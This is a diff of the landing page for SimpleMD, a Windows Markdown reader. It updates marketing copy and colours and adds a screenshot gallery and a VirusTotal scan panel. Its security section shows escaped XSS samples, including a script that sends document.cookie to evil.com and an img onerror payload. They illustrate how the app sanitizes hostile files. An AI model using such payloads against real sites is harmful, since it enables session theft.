@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SimpleMD — Markdown, beautifully simple.</title>
-  <meta name="description" content="A fast, distraction-free desktop Markdown reader and editor for Windows built for the age of AI. Renders KaTeX math and Mermaid diagrams inline, 100% local, one-click PDF export.">
+  <meta name="description" content="SimpleMD is a free, private desktop Markdown reader for Windows. KaTeX math, Mermaid diagrams and highlighted code render inline; your files never leave your machine.">
   
   <link rel="icon" type="image/svg+xml" href="favicon.svg">
   <link rel="icon" type="image/png" sizes="64x64" href="favicon.png">
@@ -45,8 +45,8 @@
       --border-active: rgba(255, 255, 255, 0.20);
       --text-primary: rgba(255, 255, 255, 0.92);
       --text-secondary: rgba(255, 255, 255, 0.60);
-      --text-muted: rgba(255, 255, 255, 0.40);
-      --accent-red: #E5484D;
+      --text-muted: rgba(255, 255, 255, 0.50);
+      --accent-red: #F25F64;
       --btn-primary-bg: #D32F2F; /* WCAG AA 4.98:1 with white */
       --btn-primary-hover: #C62828;
       --accent-red-glow: rgba(211, 47, 47, 0.16);
@@ -62,7 +62,7 @@
 
       /* Syntax Tokens - Dark */
       --gutter-bg: rgba(0, 0, 0, 0.08);
-      --gutter-text: rgba(255, 255, 255, 0.35);
+      --gutter-text: rgba(255, 255, 255, 0.50);
 
       /* Typography Scales & Measure */
       --font-serif: 'Newsreader', Georgia, serif;
@@ -82,7 +82,7 @@
       --border-active: rgba(0, 0, 0, 0.22);
       --text-primary: #121214;
       --text-secondary: #565964;
-      --text-muted: #888C99;
+      --text-muted: #6B6F7B;
       --accent-red: #D93D42;
       --btn-primary-bg: #C93237; /* WCAG AA 5.26:1 with white */
       --btn-primary-hover: #B71C1C;
@@ -1185,7 +1185,7 @@
 
     .badge-bad {
       background: rgba(255, 95, 86, 0.12);
-      color: #FF5F56;
+      color: #FF7A72;
       border: 1px solid rgba(255, 95, 86, 0.25);
     }
 
@@ -1873,6 +1873,124 @@
        SECTION 5: FEATURE GRID WITH SPOTLIGHT CARDS (#features)
        6 Spotlight Cards with pointer tracking (--mx, --my), radial glow, 2px lift
        ========================================================================== */
+    /* Real app screenshots (#screenshots) */
+    .shots-section {
+      padding: 144px 0;
+      border-top: 1px solid var(--border-hairline);
+    }
+    .shots-tabs {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+    .shots-tabs .preset-btn[aria-pressed="true"] {
+      background: var(--surface-3);
+      color: var(--text-primary);
+      border-color: var(--border-active);
+    }
+    .shots-frame {
+      margin: 0;
+    }
+    .shots-frame img {
+      display: block;
+      width: 100%;
+      height: auto;
+      aspect-ratio: 1440 / 900;
+      background: var(--surface-2);
+      transition: opacity 0.25s var(--ease-impeccable);
+    }
+    .shots-frame img.is-swapping {
+      opacity: 0.35;
+    }
+    .shots-caption {
+      margin-top: 20px;
+      text-align: center;
+      color: var(--text-secondary);
+      font-size: 0.9375rem;
+      line-height: 1.6;
+      min-height: 3.2em;
+    }
+
+    /* VirusTotal verification (#install) */
+    .scan-panel {
+      margin: 32px 0 24px;
+      background: var(--surface-1);
+      border: 1px solid var(--border-hairline);
+      border-radius: 12px;
+      box-shadow: var(--card-shadow);
+      overflow: hidden;
+    }
+    .scan-panel-head {
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--border-hairline);
+    }
+    .scan-panel-title {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+    .scan-panel-note {
+      font-size: 0.8125rem;
+      color: var(--text-secondary);
+    }
+    .scan-row {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      gap: 8px 24px;
+      align-items: center;
+      padding: 18px 24px;
+    }
+    .scan-row + .scan-row {
+      border-top: 1px solid var(--border-hairline);
+    }
+    .scan-file {
+      font-family: var(--font-mono);
+      font-size: 0.875rem;
+      color: var(--text-primary);
+    }
+    .scan-hash {
+      grid-column: 1 / -1;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      overflow-wrap: anywhere;
+    }
+    .scan-result {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.875rem;
+      color: var(--text-secondary);
+    }
+    .scan-score {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 600;
+      font-variant-numeric: tabular-nums;
+      color: #3FB27F;
+    }
+    [data-theme="light"] .scan-score {
+      color: #1E7A50;
+    }
+    @media (max-width: 640px) {
+      .scan-row {
+        grid-template-columns: 1fr;
+      }
+    }
+    @media (max-width: 480px) {
+      .nav-cta-extra {
+        display: none;
+      }
+    }
+
     .features-section {
       padding: 144px 0;
       border-top: 1px solid var(--border-hairline);
@@ -2683,6 +2801,7 @@
         <ul class="nav-links">
           <li class="nav-link-item"><a href="#problem">The Problem</a></li>
           <li class="nav-link-item"><a href="#demo">Demo</a></li>
+          <li class="nav-link-item"><a href="#screenshots">Screenshots</a></li>
           <li class="nav-link-item"><a href="#features">Features</a></li>
           <li class="nav-link-item"><a href="#security">Security</a></li>
           <li class="nav-link-item"><a href="#install">Install</a></li>
@@ -2704,7 +2823,7 @@
               <polyline points="7 10 12 15 17 10"/>
               <line x1="12" y1="15" x2="12" y2="3"/>
             </svg>
-            <span>Download for Windows</span>
+            <span>Download<span class="nav-cta-extra"> for Windows</span></span>
           </a>
         </div>
       </div>
@@ -2724,7 +2843,7 @@
         </h1>
 
         <p class="hero-subhead measure">
-          A fast, distraction-free desktop reader and editor built for the age of AI. Renders KaTeX math formulas and Mermaid diagrams inline, keeps your files completely local, and exports to PDF with one click.
+          The desktop reader for everything your AI writes. Equations come out typeset, Mermaid blocks become real diagrams, code gets highlighted, and your files never leave your machine.
         </p>
 
         <div class="hero-cta-group">
@@ -2737,13 +2856,13 @@
             <span>Download for Windows</span>
           </a>
 
-          <a href="#problem" class="btn btn-secondary btn-hero btn-magnetic">
-            <span>See it in action ↓</span>
+          <a href="#screenshots" class="btn btn-secondary btn-hero btn-magnetic">
+            <span>See the real app</span>
           </a>
         </div>
 
         <p class="hero-meta">
-          Free · MIT licensed · 100% local · No account.
+          Free · MIT licensed · Works offline · No account · 0&nbsp;VirusTotal&nbsp;detections
         </p>
 
         <div>
@@ -2889,7 +3008,7 @@
             <!-- KaTeX Math Callout -->
             <div class="math-callout">
               <div class="math-callout-formula" id="hero-math-display">
-                <span class="katex-rendered">&theta;<sub>t+1</sub> = &theta;<sub>t</sub> &minus; &eta; &nabla;<sub>&theta;</sub> <em>L</em>(&theta;<sub>t</sub>)</span>
+                <span class="katex-rendered" data-tex="\theta_{t+1} = \theta_t - \eta\,\nabla_\theta L(\theta_t)" data-display="true">&theta;<sub>t+1</sub> = &theta;<sub>t</sub> &minus; &eta; &nabla;<sub>&theta;</sub> <em>L</em>(&theta;<sub>t</sub>)</span>
               </div>
             </div>
 
@@ -2963,14 +3082,14 @@
         <div class="section-header">
           <h2 class="section-title">AI writes Markdown. <em>Finally</em> something reads it well.</h2>
           <p class="section-desc measure">
-            Large language models produce complex LaTeX formulas and Mermaid architectural diagrams on every prompt. But generic readers leave them trapped in raw, unreadable code fences.
+            ChatGPT, Claude and Copilot answer in LaTeX and Mermaid. Most Markdown readers show you the raw fences instead. Drag the handle to see the difference.
           </p>
         </div>
 
         <div class="comparison-wrapper">
           <div class="comparison-toolbar">
-            <span class="comparison-toolbar-brand">Live Rendering Comparison Engine</span>
-            <span class="comparison-toolbar-hint">Rendered View (0%) ◄ Drag or Arrow Keys ► Raw Source (100%)</span>
+            <span class="comparison-toolbar-brand">Same file, two readers</span>
+            <span class="comparison-toolbar-hint">Drag the handle or use the arrow keys</span>
           </div>
 
           <div class="comparison-container" id="comparison-container">
@@ -2979,14 +3098,14 @@
             <div class="comparison-side-left" id="comparison-left-pane" aria-hidden="true">
               <div class="comparison-tag-row align-left" id="left-tag-row">
                 <span class="comparison-badge badge-bad" id="left-badge">
-                  <span class="badge-text-full">Other Markdown Readers (Raw fences)</span>
-                  <span class="badge-text-mobile">Raw Fences</span>
+                  <span class="badge-text-full">A typical Markdown reader</span>
+                  <span class="badge-text-mobile">Typical reader</span>
                 </span>
               </div>
               
               <div class="comparison-block" id="left-block-math">
                 <h3 class="comparison-heading" id="left-heading-math">Maxwell's Electromagnetic Equations</h3>
-                <p class="comparison-lead" id="left-lead-math">Typesets KaTeX formulas with optical kerning:</p>
+                <p class="comparison-lead" id="left-lead-math">A display equation:</p>
                 <div class="comparison-box comparison-box-math" id="left-box-math">
                   <pre class="comparison-code-pre"><code>$$\nabla \times \mathbf{B} = \mu_0 \left( \mathbf{J} + \varepsilon_0 \frac{\partial \mathbf{E}}{\partial t} \right)$$</code></pre>
                 </div>
@@ -2994,7 +3113,7 @@
 
               <div class="comparison-block" id="left-block-mermaid">
                 <h3 class="comparison-heading" id="left-heading-mermaid">Distributed Architecture Flow</h3>
-                <p class="comparison-lead" id="left-lead-mermaid">Compiles Mermaid fences into live vector diagrams:</p>
+                <p class="comparison-lead" id="left-lead-mermaid">A Mermaid diagram block:</p>
                 <div class="comparison-box comparison-box-mermaid" id="left-box-mermaid">
                   <pre class="comparison-code-pre mermaid-fence-pre"><code>```mermaid
 graph LR
@@ -3008,16 +3127,16 @@ graph LR
             <div class="comparison-side-right" id="comparison-overlay">
               <div class="comparison-tag-row align-right" id="right-tag-row">
                 <span class="comparison-badge badge-good" id="right-badge">
-                  <span class="badge-text-full">SimpleMD Native (Vector &amp; Math Typeset)</span>
-                  <span class="badge-text-mobile">SimpleMD Typeset</span>
+                  <span class="badge-text-full">SimpleMD</span>
+                  <span class="badge-text-mobile">SimpleMD</span>
                 </span>
               </div>
               
               <div class="comparison-block" id="right-block-math">
                 <h3 class="comparison-heading" id="right-heading-math">Maxwell's Electromagnetic Equations</h3>
-                <p class="comparison-lead" id="right-lead-math">Typesets KaTeX formulas with optical kerning:</p>
+                <p class="comparison-lead" id="right-lead-math">A display equation:</p>
                 <div class="comparison-box comparison-box-math" id="right-box-math">
-                  <div class="katex-rendered-formula">
+                  <div class="katex-rendered-formula" data-tex="\nabla \times \mathbf{B} = \mu_0 \left( \mathbf{J} + \varepsilon_0 \frac{\partial \mathbf{E}}{\partial t} \right)" data-display="true">
                     &nabla; &times; <strong>B</strong> = &mu;<sub>0</sub> ( <strong>J</strong> + &epsilon;<sub>0</sub> &part;<strong>E</strong>/&part;<em>t</em> )
                   </div>
                 </div>
@@ -3025,7 +3144,7 @@ graph LR
 
               <div class="comparison-block" id="right-block-mermaid">
                 <h3 class="comparison-heading" id="right-heading-mermaid">Distributed Architecture Flow</h3>
-                <p class="comparison-lead" id="right-lead-mermaid">Compiles Mermaid fences into live vector diagrams:</p>
+                <p class="comparison-lead" id="right-lead-mermaid">A Mermaid diagram block:</p>
                 <div class="comparison-box comparison-box-mermaid" id="right-box-mermaid">
                   <div class="mermaid-diagram-wrap">
                     <svg viewBox="0 0 420 54" fill="none" class="mermaid-vector-flow" aria-hidden="true">
@@ -3049,14 +3168,14 @@ graph LR
             <div class="comparison-divider" id="comparison-divider" role="slider" tabindex="0"
                  aria-label="Raw Markdown source versus rendered SimpleMD view"
                  aria-valuenow="50" aria-valuemin="0" aria-valuemax="100">
-              <div class="comparison-handle-thumb" id="comparison-handle-thumb" aria-hidden="true">◂||▸</div>
+              <div class="comparison-handle-thumb" id="comparison-handle-thumb" aria-hidden="true"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 6 3 12 9 18"/><polyline points="15 6 21 12 15 18"/></svg></div>
             </div>
 
           </div>
         </div>
 
         <p class="comparison-instruction">
-          ◀ Drag slider, click anywhere on track, or use ◄ / ► / Home / End keys to compare rendering fidelity ▶
+          Drag the handle, click the track, or use the arrow, Home and End keys.
         </p>
 
       </div>
@@ -3072,7 +3191,7 @@ graph LR
         <div class="section-header">
           <h2 class="section-title">Three modes. <em>One</em> seamless flow.</h2>
           <p class="section-desc measure">
-            Toggle between focused reading, synchronized split view, and raw editing. Test real math formulas and Mermaid architecture live.
+            Read, Split and Edit, exactly like the app. Type into the editor below; the math and the diagram re-render as you go.
           </p>
         </div>
 
@@ -3164,6 +3283,38 @@ graph LR
     </section>
 
     <!-- ======================================================================
+         REAL APP SCREENSHOTS (#screenshots)
+         ====================================================================== -->
+    <section class="shots-section" id="screenshots">
+      <div class="container">
+
+        <div class="section-header">
+          <h2 class="section-title">The real app. <em>Not</em> a mockup.</h2>
+          <p class="section-desc measure">
+            Every frame below is SimpleMD 1.0.3 running on Windows, opening the kind of Markdown an AI assistant hands you.
+          </p>
+        </div>
+
+        <div class="shots-tabs" role="group" aria-label="Choose a screenshot">
+          <button type="button" class="preset-btn" aria-pressed="true" data-shot="ai-answer">Math &amp; code</button>
+          <button type="button" class="preset-btn" aria-pressed="false" data-shot="diagrams-tables">Diagrams &amp; tables</button>
+          <button type="button" class="preset-btn" aria-pressed="false" data-shot="split-view">Split view</button>
+          <button type="button" class="preset-btn" aria-pressed="false" data-shot="search">Search</button>
+          <button type="button" class="preset-btn" aria-pressed="false" data-shot="light-theme">Light theme</button>
+        </div>
+
+        <figure class="shots-frame demo-window">
+          <img id="shots-image" src="screenshots/ai-answer.png" width="2880" height="1800" loading="lazy" decoding="async"
+               alt="SimpleMD reading an AI-generated rate limiter design: rendered equation, syntax-highlighted TypeScript, outline panel on the right.">
+        </figure>
+        <p class="shots-caption" id="shots-caption" aria-live="polite">
+          An AI answer, rendered the way it was meant to look: typeset equations, highlighted code and a live outline.
+        </p>
+
+      </div>
+    </section>
+
+    <!-- ======================================================================
          SECTION 5: FEATURE GRID WITH SPOTLIGHT CARDS (#features)
          6 Spotlight Cards with pointer tracking (--mx, --my), radial glow, 2px lift
          ====================================================================== -->
@@ -3173,7 +3324,7 @@ graph LR
         <div class="section-header">
           <h2 class="section-title">Engineered for documents that <em>matter</em>.</h2>
           <p class="section-desc measure">
-            Everything technical writers, researchers, and engineers need, stripped of everything they don't.
+            Everything you need to read and fix what an AI wrote, and nothing that gets in the way.
           </p>
         </div>
 
@@ -3189,7 +3340,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">KaTeX Math Rendering</h3>
             <p class="feature-card-desc">
-              Equations and physics formulas rendered live. Inline $…$ and display $$…$$ math, rendered with KaTeX.
+              Inline <code>$…$</code> and display <code>$$…$$</code> math, typeset by KaTeX the moment the file opens. Fractions, integrals, matrices, all of it.
             </p>
           </div>
 
@@ -3205,7 +3356,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">Inline Mermaid Diagrams</h3>
             <p class="feature-card-desc">
-              Architecture flowcharts, sequence diagrams, and class models render into sharp, theme-responsive vector SVGs directly from code blocks.
+              Flowcharts, sequence diagrams and class models drawn straight from <code>```mermaid</code> blocks, as crisp vectors that follow your theme.
             </p>
           </div>
 
@@ -3220,7 +3371,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">CodeMirror 6 Source Editor</h3>
             <p class="feature-card-desc">
-              State-of-the-art modular editor engine with line numbers, intelligent tab indentation, bracket matching, and lightning input speed.
+              The editor behind modern code tools: line numbers, find and replace, bracket matching and Markdown highlighting. Fix the AI's typo, press Ctrl+S, done.
             </p>
           </div>
 
@@ -3238,7 +3389,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">Live Outline &amp; Search</h3>
             <p class="feature-card-desc">
-              Auto-updating hierarchical heading tree navigates long technical papers instantly. Full-text search across every file in your open folders.
+              A heading outline that jumps you through long documents, and instant search across every file in the folder you opened.
             </p>
           </div>
 
@@ -3254,7 +3405,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">One-Click PDF Export</h3>
             <p class="feature-card-desc">
-              Generate publication-grade PDF documents with vector typography, embedded equations, and sharp SVGs in a single keystroke.
+              Press Ctrl+P for a clean A4 PDF with the equations, diagrams and code exactly as you see them.
             </p>
           </div>
 
@@ -3268,7 +3419,7 @@ graph LR
             </div>
             <h3 class="feature-card-title">Folders &amp; Reading Customization</h3>
             <p class="feature-card-desc">
-              Open folders directly, no import step. Adjust reading width, font (Sans, Serif or Mono) and accent color, and switch between light and dark themes.
+              Open a whole folder at once, no import step. Pick Sans, Serif or Mono, set the reading width and accent, and switch light or dark.
             </p>
           </div>
 
@@ -3287,7 +3438,7 @@ graph LR
         <div class="section-header">
           <h2 class="section-title">Safe with files from <em>anyone</em>.</h2>
           <p class="section-desc measure">
-            Markdown files downloaded from the internet shouldn't be an attack vector. SimpleMD isolates, sanitizes, and saves with care.
+            A Markdown file from the internet should never be able to touch your computer. SimpleMD treats every document as untrusted.
           </p>
         </div>
 
@@ -3309,7 +3460,7 @@ graph LR
               <span>Sandboxed Renderer &amp; CSP</span>
             </h3>
             <p class="security-pillar-desc">
-              Context isolation enabled, Node integration disabled. A strict Content-Security-Policy allows only the app's own scripts and blocks frames and forms.
+              The page that shows your document is sandboxed with no Node access, and a strict Content-Security-Policy allows only the app's own scripts. It can only read the files and folders you opened.
             </p>
           </div>
 
@@ -3327,13 +3478,13 @@ graph LR
 
         <div class="xss-neutralizer-box">
   <div class="xss-header">
-    <span>The SimpleMD Sanitization Barrier</span>
+    <span>What a hostile file looks like after SimpleMD</span>
     <span class="xss-version-badge">DOMPurify Active</span>
   </div>
 
   <div class="xss-content">
     <div class="xss-col">
-      <div class="xss-pane-label xss-label-danger" id="label-input">Incoming Malicious Input:</div>
+      <div class="xss-pane-label xss-label-danger" id="label-input">In the file:</div>
       <div class="xss-code-preview" id="preview-input">
         <div class="xss-line xss-line-danger">&lt;script&gt;fetch('https://evil.com/steal?c=' + document.cookie)&lt;/script&gt;</div>
         <div class="xss-line xss-line-danger">&lt;img src="x" onerror="alert('Exploit')" /&gt;</div>
@@ -3346,7 +3497,7 @@ graph LR
     </div>
 
     <div class="xss-col">
-      <div class="xss-pane-label xss-label-safe" id="label-output">Sanitized &amp; Neutralized Output:</div>
+      <div class="xss-pane-label xss-label-safe" id="label-output">What gets rendered:</div>
       <div class="xss-code-preview" id="preview-output">
         <div class="xss-line">
           <del class="xss-struck-tag">&lt;script&gt;fetch(...)&lt;/script&gt;</del>
@@ -3383,7 +3534,7 @@ graph LR
         </blockquote>
 
         <p class="philosophy-narrative">
-          No accounts. No telemetry. Works offline. Your files never leave your machine. No AI assistants inserting unwanted text into your thoughts. SimpleMD honors the Unix philosophy: do one thing, and do it with uncompromising speed and grace.
+          No accounts. No telemetry. No cloud. No AI rewriting your notes. SimpleMD does one thing, showing your Markdown beautifully, and gets out of the way.
         </p>
 
       </div>
@@ -3397,9 +3548,9 @@ graph LR
       <div class="container">
         
         <div class="section-header">
-          <h2 class="section-title">Download for Windows in two simple steps.</h2>
+          <h2 class="section-title">Get SimpleMD for <em>Windows</em>.</h2>
           <p class="section-desc measure">
-            Choose the package that fits your workflow. SimpleMD is 100% free and open-source.
+            Pick the installer or the portable build. Both are free and open source, and not one antivirus engine on VirusTotal flagged either file.
           </p>
         </div>
 
@@ -3449,6 +3600,36 @@ graph LR
 
 </div>
 
+<!-- Independent malware scans of the current release -->
+<div class="scan-panel" aria-labelledby="scan-panel-title">
+  <div class="scan-panel-head">
+    <h3 class="scan-panel-title" id="scan-panel-title">Scanned clean on VirusTotal</h3>
+    <span class="scan-panel-note">Version 1.0.3 · no engine flagged either file</span>
+  </div>
+  <div class="scan-row">
+    <span class="scan-file">SimpleMD-Setup.exe</span>
+    <span class="scan-result">
+      <span class="scan-score">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+        0 / 53 detections
+      </span>
+      <a href="https://www.virustotal.com/gui/file/e58e5226030e3d9e940bee1af65a4d455f619c724aba56c4a73f2a6fac096dff" target="_blank" rel="noopener noreferrer" class="md-link">View report</a>
+    </span>
+    <span class="scan-hash">SHA-256 e58e5226030e3d9e940bee1af65a4d455f619c724aba56c4a73f2a6fac096dff</span>
+  </div>
+  <div class="scan-row">
+    <span class="scan-file">SimpleMD-portable.exe</span>
+    <span class="scan-result">
+      <span class="scan-score">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+        0 / 57 detections
+      </span>
+      <a href="https://www.virustotal.com/gui/file/5125c941df2de04d39e299161cc1dbe941f380234616541fbe1e52da86bf4fef" target="_blank" rel="noopener noreferrer" class="md-link">View report</a>
+    </span>
+    <span class="scan-hash">SHA-256 5125c941df2de04d39e299161cc1dbe941f380234616541fbe1e52da86bf4fef</span>
+  </div>
+</div>
+
 <!-- Windows-Only Notice Strip -->
 <div class="platform-notice-strip">
   <span>SimpleMD releases are Windows-only for now. Building for macOS or Linux?</span>
@@ -3482,7 +3663,7 @@ graph LR
             </div>
             
             <p style="margin-top: 16px; font-size: 0.8125rem;">
-              You can also read the full source on <a href="https://github.com/njaske/SimpleMD" target="_blank" rel="noopener" class="md-link">GitHub</a>, or open the <a href="https://github.com/njaske/SimpleMD/releases/latest" target="_blank" rel="noopener" class="md-link">release notes</a> for its VirusTotal scan report.
+              The scan reports above match these exact checksums. You can also read every line of the source on <a href="https://github.com/njaske/SimpleMD" target="_blank" rel="noopener" class="md-link">GitHub</a> and build it yourself.
             </p>
           </div>
         </details>
@@ -3518,7 +3699,7 @@ graph LR
       <div class="container final-cta-content">
         <h2 class="cta-headline">Your Markdown deserves <em>better</em>.</h2>
         <p class="cta-subhead measure">
-          Download SimpleMD today for Windows. Pure reading, effortless math, and distraction-free focus on your hard drive.
+          Free for Windows 10 and 11. Install it in under a minute and open the folder your AI has been filling up.
         </p>
 
         <a href="#install" class="btn btn-primary final-cta-btn btn-magnetic" id="final-cta-btn">
@@ -3531,10 +3712,10 @@ graph LR
         </a>
 
         <div class="cta-guarantee">
-          ✓ Zero Telemetry &nbsp;·&nbsp; ✓ 100% Offline Capable &nbsp;·&nbsp; ✓ No Account
+          No telemetry &nbsp;·&nbsp; Works offline &nbsp;·&nbsp; No account
         </div>
         <div style="margin-top: 16px; font-size: 0.75rem; color: var(--text-secondary); font-family: var(--font-mono);">
-          Latest release · Windows 10 &amp; 11 · 100% Free &amp; Open Source · No Account Required
+          Version 1.0.3 · Windows 10 &amp; 11 · MIT licensed
         </div>
       </div>
     </section>
@@ -3555,12 +3736,13 @@ graph LR
         <span>·</span>
         <span>Built for Windows</span>
         <span>·</span>
-        <span>Latest release</span>
+        <span>Free &amp; open source</span>
       </div>
 
       <ul class="footer-links">
         <li><a href="#problem">The Problem</a></li>
         <li><a href="#demo">Demo</a></li>
+        <li><a href="#screenshots">Screenshots</a></li>
         <li><a href="#features">Features</a></li>
         <li><a href="#security">Security</a></li>
         <li><a href="#install">Install</a></li>
@@ -3585,6 +3767,52 @@ graph LR
   <script>
     (function () {
       'use strict';
+
+      /* ------------------------------------------------------------------------
+         Real KaTeX for the static formulas (the HTML fallback stays if the
+         KaTeX CDN is unavailable)
+         ------------------------------------------------------------------------ */
+      if (window.katex) {
+        document.querySelectorAll("[data-tex]").forEach(function (el) {
+          try {
+            el.innerHTML = window.katex.renderToString(el.getAttribute("data-tex"), {
+              displayMode: el.getAttribute("data-display") === "true",
+              throwOnError: false
+            });
+          } catch (e) { /* keep the fallback markup */ }
+        });
+      }
+
+      /* ------------------------------------------------------------------------
+         Screenshot gallery tabs
+         ------------------------------------------------------------------------ */
+      const SHOTS = {
+        "ai-answer": ["SimpleMD reading an AI-generated rate limiter design: rendered equation, syntax-highlighted TypeScript, outline panel on the right.", "An AI answer, rendered the way it was meant to look: typeset equations, highlighted code and a live outline."],
+        "diagrams-tables": ["A comparison table with inline math above a Mermaid flowchart and a task list, all rendered in SimpleMD.", "Tables, task lists and Mermaid flowcharts render inline. No plugins, no extra setup."],
+        "split-view": ["Split view: Markdown source in the editor on the left, live rendered preview on the right.", "Split view: edit the source on the left, watch the preview follow as you type."],
+        "search": ["Workspace search for the word token, with every match listed by file and line.", "Search every file in the folder you opened, with each match shown in context."],
+        "light-theme": ["SimpleMD in light theme showing Fourier series equations typeset with KaTeX.", "Light or dark, one shortcut away (Ctrl+Shift+D). Long equations stay crisp in both."]
+      };
+      const shotImg = document.getElementById("shots-image");
+      const shotCaption = document.getElementById("shots-caption");
+      const shotButtons = document.querySelectorAll("[data-shot]");
+      shotButtons.forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          const key = btn.getAttribute("data-shot");
+          const info = SHOTS[key];
+          if (!info || !shotImg) return;
+          shotButtons.forEach(function (b) { b.setAttribute("aria-pressed", String(b === btn)); });
+          shotImg.classList.add("is-swapping");
+          const next = new Image();
+          next.onload = next.onerror = function () {
+            shotImg.src = next.src;
+            shotImg.alt = info[0];
+            shotImg.classList.remove("is-swapping");
+          };
+          next.src = "screenshots/" + key + ".png";
+          shotCaption.textContent = info[1];
+        });
+      });
 
       /* ------------------------------------------------------------------------
          1. THEME SWITCHER & PREFERS-COLOR-SCHEME
